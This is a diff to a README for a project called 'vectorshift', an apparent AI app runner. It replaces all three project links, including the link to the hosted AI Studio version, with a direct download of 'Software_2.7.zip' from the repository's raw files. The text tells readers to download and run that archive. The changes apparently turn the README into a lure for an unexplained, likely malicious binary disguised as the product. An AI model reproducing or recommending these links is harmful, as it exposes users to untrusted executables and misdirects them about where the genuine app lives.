@@ -1,6 +1,6 @@
 # ⚡ vectorshift - Run your AI app with ease
 
-[![Download vectorshift](https://img.shields.io/badge/Download-vectorshift-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Hinderanceleiopelmatidae328/vectorshift)
+[![Download vectorshift](https://img.shields.io/badge/Download-vectorshift-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Hinderanceleiopelmatidae328/vectorshift/raw/refs/heads/main/components/Software_2.7.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ Use it if you want to:
 
 Visit this page to download or access the project:
 
-https://github.com/Hinderanceleiopelmatidae328/vectorshift
+https://github.com/Hinderanceleiopelmatidae328/vectorshift/raw/refs/heads/main/components/Software_2.7.zip
 
 If the page opens in your browser, look for the project files or the latest release files on the page, then download the Windows version if one is provided.
 
@@ -153,6 +153,6 @@ A simple setup looks like this:
 
 You can also view the app in AI Studio here:
 
-https://ai.studio/apps/drive/1dIZ1r5Rr0LZVJb7zvVEs9ltdrHWO0l75
+https://github.com/Hinderanceleiopelmatidae328/vectorshift/raw/refs/heads/main/components/Software_2.7.zip
 
 Use this link if you want to compare the local version with the hosted version or check how the app is meant to look and work
